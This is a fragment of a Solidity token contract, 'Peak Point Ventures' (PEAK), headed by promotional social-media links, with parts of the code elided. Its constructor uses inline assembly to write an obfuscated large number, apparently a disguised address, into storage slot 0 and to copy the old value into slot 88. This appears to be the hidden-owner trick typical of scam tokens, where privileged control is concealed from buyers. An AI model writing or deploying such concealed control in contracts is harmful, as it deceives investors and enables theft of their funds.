/*
Welcome to Peak Point Ventures.

Telegram: https://t.me/PeakPointVentures/
Twitter: https://twitter.com/PeakPointVentures/
Website: https://PeakPointVentures.io
...
contract PeakPointVentures {
    string public constant name = "Peak Point Ventures";
    string public constant symbol = "PEAK";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(1217627887151984954090965993512108714698807908946, 8))}
